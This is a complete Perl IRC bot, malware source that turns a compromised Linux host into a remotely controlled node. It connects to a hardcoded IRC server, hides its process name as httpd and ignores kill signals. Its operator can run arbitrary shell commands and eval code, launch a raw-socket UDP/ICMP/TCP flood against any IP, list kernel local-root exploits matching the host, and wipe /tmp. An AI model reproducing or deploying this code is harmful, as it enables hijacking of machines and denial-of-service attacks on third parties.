#!/usr/bin/perl
#ddos command
#>bot +Uzxyflood ip packet time#
####################################
use HTTP::Request;
use LWP::UserAgent;
my $processo = 'usr/sbin/httpd';
my $linas_max='10';
my $sleep='5';
my $cmd="http://h4ck3d.wsnw.net/mic22.txt";
my $id="http://h4ck3d.wsnw.net/mic22.txt";
############################################
my @adms=("Jihadi");
my @canais=("#perl");
#Put your channel here
my @nickname = ("Linux");
my $nick = $nickname[rand scalar @nickname];
#Nickname of bot 
my $ircname ='irc.jihadirc.gov';
chop (my $realname = 'bot');
#IRC name and Realname 
$servidor='69.197.175.14' unless $servidor;
my $porta='1337'; 
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
   if ($#_ == '1') {
      my $socket = $_[0];
      print $socket "$_[1]\n";

   } else {
      print $IRC_cur_socket "$_[0]\n";
   }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
   PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
      $IRC_cur_socket = $IRC_socket;
      $IRC_socket->autoflush(1);
      $sel_cliente->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
      nick("$meunick");
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
      sleep 1;
   }
}

my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
      $IRC_cur_socket = $fh;
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
      $nread = sysread($fh, $msg, 4096);
      if ($nread == 0) {
         $sel_cliente->remove($fh);
         $fh->close;
         delete($irc_servers{$fh});
      }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
         $line = $lines[$c];
         $line=$line_temp.$line if ($line_temp);
         $line_temp='';
         $line =~ s/\r$//;
         unless ($c == $#lines) {
            parse("$line");
         } else {
            if ($#lines == 0) {
               parse("$line");
            } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line"); 
            } else {
               $line_temp = $line;
            }
         }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
      sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
      if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.17 w3tw0rk\001");
      }
      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
         if ($onde eq "$meunick"){
            shell("$pn", "$args");
         }
#End of Connect
         if ($args =~ /^(\Q$meunick\E|\>bot)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
               ircase("$pn","$onde","$1") unless ($natrix eq ">bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\+(.*)/) {
               $ondep = $onde;
               $ondep = $pn if $onde eq $meunick;
               bfunc("$ondep","$1");
            } else {
               shell("$onde", "$arg");
            }
         }
      }
   }
######################### End of prefix
   elsif ($servarg =~ /^\:(.+?)\!(.+?)\+(.+?)\s+NICK\s+\:(\S+)/i) {
      if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
      nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
      $meunick = $2;
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
      foreach my $canal (@canais) {
         sendraw("JOIN $canal $key");
      }
   }
}

sub bfunc {
   my $printl = $_[0];
   my $funcarg = $_[1];
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {

         if ($funcarg =~ /^killme/) {
            sendraw($IRC_cur_socket, "QUIT :");
            $killd = "kill -9 ".fork;
            system (`$killd`);
         }
######################
#        Rootable    #
######################
if ($funcarg =~ /^rootable/) { 
my $khost = `uname -r`;
my $currentid = `whoami`;
sendraw($IRC_cur_socket, "PRIVMSG $printl Currently you are ".$currentid." ");
sendraw($IRC_cur_socket, "PRIVMSG $printl The kernel of this box is ".$khost." ");
chomp($khost);

   my %h;
   $h{'w00t'} = { 
      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] 
   };
   
   $h{'brk'} = {
      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] 
   };
   
   $h{'ave'} = {
      vuln=>['2.4.19','2.4.20'] 
   };
   
   $h{'elflbl'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'elfdump'} = {
      vuln=>['2.4.27']
   };
   
   $h{'expand_stack'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'h00lyshit'} = {
      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
   };
   
   $h{'kdump'} = {
      vuln=>['2.6.13'] 
   };
   
   $h{'km2'} = {
      vuln=>['2.4.18','2.4.22']
   };
   
   $h{'krad'} = {
      vuln=>['2.6.11']
   };
   
   $h{'krad3'} = {
      vuln=>['2.6.11','2.6.9']
   };
   
   $h{'local26'} = {
      vuln=>['2.6.13']
   };
   
   $h{'loko'} = {
      vuln=>['2.4.22','2.4.23','2.4.24'] 
   };
   
   $h{'mremap_pte'} = {
      vuln=>['2.4.20','2.2.25','2.4.24'] 
   };
   
   $h{'newlocal'} = {
      vuln=>['2.4.17','2.4.19','2.4.18'] 
   };
   
   $h{'ong_bak'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'ptrace'} = {
      vuln=>['2.2.','2.4.22'] 
   };
   
   $h{'ptrace_kmod'} = {
      vuln=>['2.4.2'] 
   };
   
   $h{'ptrace24'} = {
      vuln=>['2.4.9'] 
   };
   
   $h{'pwned'} = {
      vuln=>['2.4.','2.6.'] 
   };
   
   $h{'py2'} = {
      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] 
   };
   
   $h{'raptor_prctl'} = {
      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] 
   };
   
   $h{'prctl3'} = {
      vuln=>['2.6.13','2.6.17','2.6.9'] 
   };
   
   $h{'remap'} = {
      vuln=>['2.4.'] 
   };
   
   $h{'rip'} = {
      vuln=>['2.2.'] 
   };
   
   $h{'stackgrow2'} = {
      vuln=>['2.4.29','2.6.10'] 
   };
   
   $h{'uselib24'} = {
      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] 
   };
   
   $h{'newsmp'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'smpracer'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'loginx'} = {
      vuln=>['2.4.22'] 
   };
   
   $h{'exp.sh'} = {
      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] 
   };
   
   $h{'prctl'} = {
      vuln=>['2.6.'] 
   };
   
   $h{'kmdx'} = {
      vuln=>['2.6.','2.4.'] 
   };
   
   $h{'raptor'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
   $h{'raptor2'} = {
      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
   };
   
foreach my $key(keys %h){
foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ 
   if($khost=~/^$kernel/){
   chop($kernel) if ($kernel=~/.$/);
   sendraw($IRC_cur_socket, "PRIVMSG $printl Possible Local Root Exploits: ". $key ." ");
      }
   }
}
}

# A /tmp cleaner
if ($funcarg =~ /^cleartmp/) { 
    system 'cd /tmp;rm -rf *';
         sendraw($IRC_cur_socket, "PRIVMSG $printl /tmp is Cleaned");
         }
######################
#    MULTI SCANNER   #
######################
#     UDPFlood       #
######################
         if ($funcarg =~ /^Uzxyflood\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl : 4Attacking 14".$1." 4with 14".$2." 4Packets 14for ".$3." 4seconds");
            my ($dtime, %pacotes) = Uzxyflood("$1", "$2", "$3");
            $dtime = 1 if $dtime == 0;
            my %bytes;
            $bytes{igmp} = $2 * $pacotes{igmp};
            $bytes{icmp} = $2 * $pacotes{icmp};
            $bytes{o} = $2 * $pacotes{o};
            $bytes{udp} = $2 * $pacotes{udp};
            $bytes{tcp} = $2 * $pacotes{tcp};
            sendraw($IRC_cur_socket, "PRIVMSG $printl : 4Attack Sent ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)."Kb in ".$dtime." seconds to ".$1."");
         }
######################
#  End of Udpflood   #
######################
         exit;
      }
   }

sub ircase {
   my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
      j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
         for (my $ca = 1; $ca <= $1; $ca++ ) {
            p("$2");
            j("$2");
         }
      } else {
         p("$chan");
         j("$chan");
      }
   }

   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         msg("$2", "$3");
      }
   }

   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }

   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
         ctcp("$2", "$3");
      }
   }

   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
      conectar("$2", "$1", 6667);
   }

   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }

   if ($case =~ /^eval (.*)/) {
      eval "$1";
   }
}

sub get_html() {
$test=$_[0];

      $ip=$_[1];
      $port=$_[2];

my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
if(defined($ip) && defined($port)) {
      $ua->proxy("http","http://$ip:$port/");
      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
}
$ua->timeout(1);
my $response=$ua->request($req);
if ($response->is_success) {
   $re=$response->content;
}
return $re;
}

sub addproc {

   my $proc=$_[0];
   my $dork=$_[1];
   
   open(FILE,">>/var/tmp/pids");
   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
   close(FILE);
}


sub delproc {

   my $proc=$_[0];
   open(FILE,"/var/tmp/pids");

   while(<FILE>) {
      $_ =~ /(\d+)\s+(.*)/;
      $childs{$1}=$2;
   }
   close(FILE);
   delete($childs{$proc});

   open(FILE,">/var/tmp/pids");

   for $klucz (keys %childs) {
      print FILE $klucz." ".$childs{$klucz}."\n";
   }
}

sub shell {
   my $printl=$_[0];
   my $comando=$_[1];
   if ($comando =~ /cd (.*)/) {
      chdir("$1") || msg("$printl", "No such file or directory");
      return;
   } elsif ($pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {
         my @resp=`$comando 2>&1 3>&1`;
         my $c=0;
         foreach my $linha (@resp) {
            $c++;
            chop $linha;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
            if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
            }
         }
         exit;
      }
   }
}

sub Uzxyflood {
   my $iaddr = inet_aton($_[0]);
   my $msg = 'A' x $_[1];
   my $ftime = $_[2];
   my $cp = 0;
   my (%pacotes);
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
      for (my $porta = 1; $porta <= 65000; $porta++) {
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
         for (my $pc = 3; $pc <= 255;$pc++) {
            next if $pc == 6;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
         }
      }
      last if $cur_time >= $ftime;
   }
   return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}

sub j {
   &join(@_);
}

sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}

sub p {
   part(@_);
}

sub part {
   sendraw("PART $_[0]");
}

sub nick {
   return unless $#_ == 0;
   sendraw("NICK $_[0]");
}

sub quit {
   sendraw("QUIT :$_[0]");
}
}